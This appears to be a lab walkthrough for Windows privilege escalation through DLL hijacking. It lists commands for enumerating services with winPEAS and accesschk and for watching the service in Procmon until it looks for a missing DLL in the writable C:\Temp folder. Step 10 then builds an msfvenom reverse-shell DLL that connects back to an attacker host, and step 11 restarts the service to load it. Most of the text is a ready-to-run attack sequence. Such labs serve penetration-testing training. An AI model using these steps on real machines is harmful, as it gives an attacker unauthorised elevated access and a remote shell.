1.Use winPEAS to enumerate non-Windows services:
> .\winPEASany.exe quiet servicesinfo


2.Note that the C:\Temp directory is writable and in the PATH. 

Start by enumerating which of these services our user has stop and start access to:
> .\accesschk.exe /accepteula -uvqc user dllsvc


3.The “dllsvc” service is vulnerable to DLL Hijacking. According to the winPEAS output, the service runs the dllhijackservice.exe executable. 

We can confirm this manually:
> sc qc dllsvc

4.Run Procmon64.exe with administrator privileges. Press
Ctrl+L to open the Filter menu.

5.Add a new filter on the Process Name matching
dllhijackservice.exe.

6.On the main screen, deselect registry activity and
network activity.

7.Start the service:
> net start dllsvc


8.Back in Procmon, note that a number of “NAME NOT
FOUND” errors appear, associated with the hijackme.dll file.

9.At some point, Windows tries to find the file in the C:\Temp
directory, which as we found earlier, is writable by our user.

10. On Kali, generate a reverse shell DLL named hijackme.dll:

 msfvenom -p windows/x64/shell_reverse_tcp
LHOST=192.168.1.11 LPORT=53 -f dll -o
hijackme.dll


11. Copy the DLL to the Windows VM and into the C:\Temp directory. 

Start a listener on Kali and then stop/start the service to trigger the exploit:
> net stop dllsvc
> net start dllsvc
